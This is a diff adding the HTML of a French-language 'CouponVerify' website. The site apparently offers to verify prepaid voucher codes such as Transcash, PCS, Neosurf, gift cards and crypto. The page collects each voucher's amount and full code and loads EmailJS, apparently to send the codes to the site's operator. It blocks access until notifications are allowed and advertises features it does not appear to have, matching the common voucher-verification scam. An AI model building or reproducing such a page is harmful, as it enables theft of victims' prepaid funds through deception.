@@ -1,0 +1,221 @@
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="description" content="Vérifiez vos coupons avec notre outil en ligne. Entrez votre code de coupon et obtenez une confirmation instantanée par email.">
+        <meta name="keywords" content="vérification de coupons, coupons Transcash, vérificateur de coupons, code coupon, coupon en ligne">
+        <meta name="robots" content="index, follow">
+        <meta name="Max Chenet" content="Verificoupons">
+        <link rel="canonical" href="https://verificationcp.onrender.com/">
+        <link rel="apple-touch-icon" sizes="57x57" href="apple-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="60x60" href="apple-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="72x72" href="apple-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="76x76" href="apple-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="114x114" href="apple-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="120x120" href="apple-icon-120x120.png">
+<link rel="apple-touch-icon" sizes="144x144" href="apple-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="152x152" href="apple-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="apple-icon-180x180.png">
+<link rel="icon" type="image/png" sizes="192x192"  href="android-icon-192x192.png">
+<link rel="icon" type="image/png" sizes="32x32" href="favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="96x96" href="favicon-96x96.png">
+<link rel="icon" type="image/png" sizes="16x16" href="favicon-16x16.png">
+<link rel="manifest" href="manifest.json">
+<meta name="msapplication-TileColor" content="#ffffff">
+<meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
+<meta name="theme-color" content="#ffffff">
+        <!-- Open Graph Meta Tags -->
+        <meta property="og:title" content="Vérification de Coupons ">
+        <meta property="og:description" content="Vérifiez vos coupons avec notre outil en ligne. Entrez votre code de coupon et obtenez une confirmation instantanée par email.">
+        <meta property="og:image" content="graph.png">
+        <meta property="og:url" content="https://verificationcp.onrender.com/">
+        <meta property="og:type" content="website">
+<title>CouponVerify - Vérification Multilingue de Coupons</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@10.16.6/dist/sweetalert2.min.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init({
+                publicKey: "mXqeBMVkSPkuP7And",
+            });
+        })();
+    </script>
+<link rel="stylesheet" href="styles.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/js/all.min.js"></script>
+</head>
+<body>
+ <div id="permission-blocker">
+        Veuillez autoriser les notifications pour accéder au site.
+    </div>
+    <header>
+        <div class="logo">CouponVerify</div>
+      <nav>
+            <ul>
+                <li><a href="index.html#home" class="nav-home">Accueil</a></li>
+                <li><a href="index.html#features" class="nav-features">Fonctionnalités</a></li>
+               
+            </ul>
+        </nav> 
+        <div class="language-selector">
+            <button class="language-button">
+                <img src="https://flagcdn.com/w40/fr.png" alt="Drapeau français" width="24" height="16">
+                <span>FR</span>
+            </button>
+            <div class="language-dropdown">
+                <a href="index.html#" data-lang="fr"><img src="https://flagcdn.com/w40/fr.png" alt="Drapeau français" width="24" height="16"> FR</a>
+                <a href="index.html#" data-lang="en"><img src="https://flagcdn.com/w40/gb.png" alt="Drapeau britannique" width="24" height="16"> EN</a>
+                <a href="index.html#" data-lang="es"><img src="https://flagcdn.com/w40/es.png" alt="Drapeau espagnol" width="24" height="16"> ES</a>
+                <a href="index.html#" data-lang="de"><img src="https://flagcdn.com/w40/de.png" alt="Drapeau allemand" width="24" height="16"> DT</a>
+                <a href="index.html#" data-lang="it"><img src="https://flagcdn.com/w40/it.png" alt="Drapeau italien" width="24" height="16"> IT</a>
+                <a href="index.html#" data-lang="pl"><img src="https://flagcdn.com/w40/pl.png" alt="Drapeau poloais" width="24" height="16"> PL</a>
+                <a href="index.html#" data-lang="ja"><img src="https://flagcdn.com/w40/jp.png" alt="Drapeau japonais" width="24" height="16"> 日本語</a>
+                <a href="index.html#" data-lang="zh"><img src="https://flagcdn.com/w40/cn.png" alt="Drapeau chinois" width="24" height="16"> 中文</a>
+            </div>
+        </div>
+        <button class="dark-mode-toggle" aria-label="Basculer le mode sombre">
+            <i class="fas fa-moon"></i>
+        </button>
+    </header>
+
+    <main class="fade-in">
+        <h1 class="main-title">Vérifiez vos coupons en un clic</h1>
+        <p class="main-description">Choisissez le type de coupon que vous souhaitez vérifier :</p>
+        <div class="coupon-grid">
+            <div class="coupon-card" data-coupon="Google Play">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg" alt="Logo Google Play" width="80" height="80">
+                <h3>Google Play</h3>
+            </div>
+            <div class="coupon-card" data-coupon="Steam">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg" alt="Logo Steam" width="80" height="80">
+                <h3>Steam</h3>
+            </div>
+            <div class="coupon-card" data-coupon="Apple">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Logo Apple" width="80" height="80">
+                <h3>Apple</h3>
+            </div>
+            <div class="coupon-card" data-coupon="Amazon">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/4/4a/Amazon_icon.svg" alt="Logo Amazon" width="80" height="80">
+                <h3>Amazon</h3>
+            </div>
+            <div class="coupon-card" data-coupon="Netflix">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Logo Netflix" width="80" height="80">
+                <h3>Netflix</h3>
+            </div>
+            <div class="coupon-card" data-coupon="NeoSurf">
+                <img src="logos/logo4.png" alt="Logo NeoSurf" width="80" height="80">
+                <h3>Neosurf</h3>
+            </div>
+            <div class="coupon-card" data-coupon="Transcash">
+                <img src="logos/logo8.png" alt="Logo Transcash" alt="Logo Transcash" width="80" height="80">
+                <h3>Transcash</h3>
+            </div>
+            <div class="coupon-card" data-coupon="Ethereum">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Ethereum_logo_2014.svg" alt="Logo Ethereum" width="80" height="80">
+                <h3>Ethereum</h3>
+            </div>
+            <div class="coupon-card" data-coupon="Dogecoin">
+                <img src="https://upload.wikimedia.org/wikipedia/en/d/d0/Dogecoin_Logo.png" alt="Logo Dogecoin" width="80" height="80">
+                <h3>Dogecoin</h3>
+            </div>
+            <div class="coupon-card" data-coupon="Bitcoin">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg" alt="Logo Bitcoin" width="80" height="80">
+                <h3>Bitcoin</h3>
+            </div>
+            <div class="coupon-card" data-coupon="PCS">
+                <img src="logos/logo5.png" alt="Logo PCS" width="80" height="80">
+                <h3>PCS</h3>
+            </div>
+            <div class="coupon-card" data-coupon="Visa">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Logo Visa" width="80" height="80">
+                <h3>Visa</h3>
+            </div>
+        </div>
+
+        <div class="verification-form" id="verification-form">
+            <h2 class="verification-title">Vérification du coupon</h2>
+<label for="coupon-amount"></i> <h3>Montant du Coupon</h3> </label>
+<div style="display: flex; align-items: center; gap: -10px;">
+    <!-- Sélecteur de devises avec une classe pour le style -->
+    <select id="currency-select" class="styled-select" required>
+        <option value="EUR">EUR (€)</option>
+        <option value="USD">USD ($)</option>
+        <option value="GBP">GBP (£)</option>
+        <option value="JPY">JPY (¥)</option>
+        <option value="AUD">AUD (A$)</option>
+        <option value="CAD">CAD (C$)</option>
+        <option value="CHF">CHF (Fr)</option>
+        <option value="CNY">CNY (¥)</option>
+        <option value="INR">INR (₹)</option>
+        <!-- Ajoutez d'autres devises si nécessaire -->
+    </select>
+
+    <!-- Champ d'entrée pour le montant du coupon -->
+    <input type="number" id="coupon-amount" required placeholder="Entrez le montant du coupon">
+</div>
+            <div class="coupon-container">
+     <h3 class="coupon-label">
+        <label for="coupon-code">Code Coupon <i class="fas fa-ticket-alt"></i></label>
+    </h3>
+    <input type="password" id="coupon-code" placeholder="Entrez votre code coupon" class="coupon-input" required minlength="8">
+    
+    <button class="show-hide-btn" id="toggle-password" aria-label="Afficher/Masquer le code">
+        👁️
+    </button>
+    
+    <button id="verify-button" class="verify-button" type="submit">Vérifier</button>
+    
+    <p id="verification-result" class="verification-result"></p>
+</div>
+        </div>
+
+        <section id="features" class="feature-section">
+            <h2 class="features-title">Nos fonctionnalités</h2>
+            <div class="feature-grid">
+                <div class="feature-card">
+                    <i class="fas fa-globe"></i>
+                    <h3>Multilingue</h3>
+                    <p>Traduisez instantanément le contenu dans plusieurs langues</p>
+                </div>
+                <div class="feature-card">
+                    <i class="fas fa-shield-alt"></i>
+                    <h3>Sécurité renforcée</h3>
+                    <p>Vérification sécurisée des coupons avec cryptage avancé</p>
+                </div>
+                <div class="feature-card">
+                    <i class="fas fa-history"></i>
+                    <h3>Historique des vérifications</h3>
+                    <p>Suivez vos vérifications précédentes facilement</p>
+                </div>
+                <div class="feature-card">
+                    <i class="fas fa-mobile-alt"></i>
+                    <h3>Application mobile</h3>
+                    <p>Vérifiez vos coupons en déplacement avec notre app</p>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <p class="footer-text">&copy; 2023 CouponVerify. Tous droits réservés.</p>
+        <div class="social-icons">
+            <a href="index.html#"><i class="fab fa-facebook"></i></a>
+            <a href="index.html#"><i class="fab fa-twitter"></i></a>
+            <a href="index.html#"><i class="fab fa-instagram"></i></a>
+            <a href="index.html#"><i class="fab fa-linkedin"></i></a>
+        </div>
+    </footer>
+    <div id="loader" class="loader-container">
+        <div class="loader"></div>
+    </div>
+  <!-- Compte à rebours affiché ici -->
+    <div id="countdown" style="display: none;"></div>
+
+    <!-- Notifications apparaîtront ici -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/push.js/1.0.0/push.min.js"></script>
+    <script src="script.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10.16.6/dist/sweetalert2.all.min.js"></script>
+<!-- Push.js pour les notifications -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/push.js/1.0.12/push.min.js"></script>
+</body>
+</html>
